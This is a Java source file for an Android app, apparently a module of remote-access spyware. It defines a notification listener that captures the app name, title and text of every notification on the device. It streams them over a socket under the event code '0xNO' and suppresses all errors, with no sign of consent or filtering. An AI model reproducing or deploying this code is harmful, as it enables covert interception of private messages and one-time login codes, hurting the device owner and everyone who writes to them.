package com.fason.app.notifications;

import android.app.Notification;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import com.fason.app.core.network.SocketClient;

import org.json.JSONObject;

public class NotificationRelayService extends NotificationListenerService {

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null || sbn.getNotification() == null) return;

        try {
            Notification n = sbn.getNotification();
            String title = n.extras != null ? n.extras.getString(Notification.EXTRA_TITLE, "") : "";
            CharSequence textCs = n.extras != null ? n.extras.getCharSequence(Notification.EXTRA_TEXT) : null;
            String text = textCs != null ? textCs.toString() : "";

            JSONObject data = new JSONObject();
            data.put("appName", sbn.getPackageName());
            data.put("title", title);
            data.put("content", text);
            data.put("postTime", sbn.getPostTime());

            SocketClient.getInstance().getSocket().emit("0xNO", data);
        } catch (Exception ignored) {}
    }
}
